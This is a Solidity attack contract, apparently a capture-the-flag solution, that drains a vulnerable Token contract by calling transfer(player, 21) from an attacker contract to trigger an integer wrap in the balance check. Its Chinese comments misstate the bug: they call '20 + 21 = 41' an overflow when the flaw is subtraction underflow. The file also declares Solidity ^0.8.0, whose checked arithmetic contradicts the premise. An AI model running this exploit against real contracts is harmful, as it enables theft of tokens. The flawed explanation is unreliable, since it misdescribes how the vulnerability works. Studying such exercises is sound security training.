// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/StdCheats.sol";
import "../src/Token.sol";

contract TokenAttack {
    Token token;
    address player;

    constructor(Token _token, address _player) {
        token = _token;
        player = _player;
    }

    // 攻击函数：利用整数溢出漏洞
    function exploit() public {
        // 转移21个代币，导致余额溢出
        // 假设攻击者有20个代币，20 + 21 = 41，在Solidity < 0.8中会溢出
        token.transfer(player, 21);
    }
}